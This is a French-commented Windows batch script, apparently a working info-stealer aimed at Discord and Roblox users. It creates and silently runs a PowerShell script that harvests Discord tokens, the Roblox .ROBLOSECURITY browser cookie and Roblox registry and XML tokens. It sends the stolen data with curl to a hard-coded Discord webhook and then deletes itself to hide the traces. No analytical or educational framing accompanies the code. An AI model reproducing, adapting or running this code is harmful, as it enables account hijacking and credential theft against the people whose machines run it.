@echo off
setlocal enabledelayedexpansion
:: PALOFSC - EXFILTRATION COMPLETE (DISCORD + ROBLOX)

set "WEBHOOK=https://discord.com/api/webhooks/1524390694376964226/1JXT_Rnb0ocyCJDBnZPuyY9qLctiKxsQe_-phkaif_Hap7ZbRugKdshY6wlYp9Jyq1T8"

:: ETAPE 1 : CREATION DU SCRIPT POWERSHELL UNIQUE POUR LES DEUX
set "psfile=%TEMP%\extract_full.ps1"
set "outfile=%TEMP%\result.txt"
(
echo # --- RECHERCHE TOKENS DISCORD ---
echo $paths = @(
echo     "$env:APPDATA\Discord\Local Storage\leveldb",
echo     "$env:APPDATA\discordptb\Local Storage\leveldb",
echo     "$env:APPDATA\discordcanary\Local Storage\leveldb"
echo )
echo $tokens = @()
echo $patternDiscord = '[a-zA-Z0-9_\-]{20,60}\.[a-zA-Z0-9_\-]{6,20}\.[a-zA-Z0-9_\-]{20,80}'
echo foreach ($p in $paths) {
echo     if (Test-Path $p) {
echo         Get-ChildItem $p -File ^| ForEach-Object {
echo             Select-String -Path $_.FullName -Pattern $patternDiscord -AllMatches ^| ForEach-Object { $_.Matches.Value }
echo         } ^| ForEach-Object { $tokens += $_ }
echo     }
echo }
echo $tokens = $tokens ^| Select-Object -Unique
echo $discordTokens = $tokens -join ' '
echo.
echo # --- RECHERCHE COOKIE ROBLOX (.ROBLOSECURITY) DANS CHROME/EDGE ---
echo $robloxCookie = $null
echo $browsers = @(
echo     "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies",
echo     "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
echo )
echo $found = $false
echo foreach ($b in $browsers) {
echo     if (Test-Path $b) {
echo         try {
echo             $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$b")
echo             $conn.Open()
echo             $cmd = $conn.CreateCommand()
echo             $cmd.CommandText = "SELECT value FROM cookies WHERE host_key LIKE '%%roblox.com%%' AND name = '.ROBLOSECURITY'"
echo             $reader = $cmd.ExecuteReader()
echo             if ($reader.Read()) {
echo                 $robloxCookie = $reader.GetString(0)
echo                 $found = $true
echo                 $reader.Close()
echo                 $conn.Close()
echo                 break
echo             }
echo             $reader.Close()
echo             $conn.Close()
echo         } catch {
echo             # SQLite non disponible
echo         }
echo     }
echo }
echo if (-not $found) {
echo     # Fallback : chercher dans les fichiers cookies texte (ancien navigateur)
echo     $cookiePaths = @(
echo         "$env:APPDATA\Microsoft\Windows\Cookies",
echo         "$env:LOCALAPPDATA\Microsoft\Windows\INetCookies"
echo     )
echo     foreach ($cp in $cookiePaths) {
echo         if (Test-Path $cp) {
echo             Get-ChildItem $cp -Filter *.txt ^| ForEach-Object {
echo                 Select-String -Path $_.FullName -Pattern 'ROBLOSECURITY=[^;]+' ^| ForEach-Object { $_.Matches.Value }
echo             } ^| ForEach-Object {
echo                 $val = $_ -replace 'ROBLOSECURITY=',''
echo                 if ($val -match '^[a-zA-Z0-9_\-]+$') { $robloxCookie = $val; $found = $true }
echo             }
echo             if ($found) { break }
echo         }
echo     }
echo }
echo.
echo # --- RECHERCHE ROBLOX DANS LE REGISTRE ET FICHIER XML ---
echo $robloxUser = $null
echo $robloxRemember = $null
echo try {
echo     $robloxUser = (Get-ItemProperty -Path "HKCU:\Software\Roblox\RobloxStudio" -Name "UserID" -ErrorAction SilentlyContinue).UserID
echo } catch {}
echo try {
echo     $robloxRemember = (Get-ItemProperty -Path "HKCU:\Software\Roblox\RobloxStudio" -Name "RememberMe" -ErrorAction SilentlyContinue).RememberMe
echo } catch {}
echo $robloxToken = $null
echo $xmlPath = "$env:LOCALAPPDATA\Roblox\GlobalBasicSettings_13.xml"
echo if (Test-Path $xmlPath) {
echo     $xml = [xml](Get-Content $xmlPath -ErrorAction SilentlyContinue)
echo     if ($xml -and $xml.settings -and $xml.settings.token) {
echo         $robloxToken = $xml.settings.token
echo     }
echo }
echo.
echo # --- CONSTRUCTION DU MESSAGE FINAL ---
echo $msg = ""
echo if ($discordTokens -ne "") { $msg += "Tokens Discord : $discordTokens`n" }
echo if ($robloxCookie -ne $null) { $msg += "Roblox Cookie (.ROBLOSECURITY) : $robloxCookie`n" }
echo if ($robloxUser -ne $null) { $msg += "Roblox UserID : $robloxUser`n" }
echo if ($robloxRemember -ne $null) { $msg += "Roblox RememberMe : $robloxRemember`n" }
echo if ($robloxToken -ne $null) { $msg += "Roblox Token (XML) : $robloxToken`n" }
echo if ($msg -eq "") { $msg = "Aucune donnee collectee.`n" }
echo $msg ^| Out-File -FilePath '%outfile%' -Encoding utf8
) > "%psfile%"

:: ETAPE 2 : EXECUTER LE POWERSHELL (AVEC -NOLOGO, SILENCIEUX)
powershell -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%psfile%" 2>nul

:: ETAPE 3 : LIRE LE FICHIER DE SORTIE
set "msg="
if exist "%outfile%" (
    for /f "usebackq delims=" %%a in ("%outfile%") do set "msg=%%a"
    del /f /q "%outfile%" >nul 2>&1
)
del /f /q "%psfile%" >nul 2>&1

:: ETAPE 4 : SI MSG VIDE, FORCER UN MESSAGE PAR DEFAUT
if "!msg!"=="" set "msg=Aucune donnee collectee.\n"

:: ETAPE 5 : ECHAPPEMENT JSON
set "msg=!msg:"=\"!"
set "msg=!msg:\n=\\n!"

:: ETAPE 6 : ENVOI VIA CURL
curl -s -H "Content-Type: application/json" -d "{\"content\":\"%msg%\"}" "%WEBHOOK%" >nul 2>&1

:: ETAPE 7 : NETTOYAGE
set "msg="
del /f /q "%~f0" >nul 2>&1
exit /b 0
